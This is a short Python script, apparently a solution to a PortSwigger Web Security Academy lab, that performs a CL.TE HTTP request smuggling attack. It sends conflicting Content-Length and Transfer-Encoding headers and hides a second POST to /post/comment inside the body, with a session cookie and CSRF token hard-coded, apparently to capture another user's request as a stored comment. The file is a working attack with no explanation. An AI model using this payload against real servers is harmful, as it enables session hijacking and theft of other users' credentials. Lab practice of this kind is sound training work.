import http.client

if __name__ == "__main__":
    lab_id="0ae6008d030155a280ef3f98009c0031" +".web-security-academy.net"
    
    
    header={
        "Host": f"{lab_id}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "265",
        "Transfer-Encoding": "chunked",
    }
   
    headers = {
        "Host": f"{lab_id}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "265",
        "Transfer-Encoding": "chunked",
    }
 
    

    csrf_session="NpQ4sskQGvfSg5iA6Ez5HwOInm7EGBLW"
    body=f"0\r\n\r\nPOST /post/comment HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 910\r\nCookie: session=PEQ7pS5CHawWZ3KwjvQuivYw8JRrB2xX\r\n\r\ncsrf={csrf_session}&postId=2&name=carlos&email=carlos%40gmail.com&website=&comment=comment2"
    connection = http.client.HTTPSConnection(lab_id)
    connection.request("POST","/",headers=header,body=body)
    response = connection.getresponse()
    if response.status == 200:
        print("ok")
    else:
        content = response.read().decode("utf-8")
        print(f"NO: {response.status} {response.reason} {content}")
      

  
 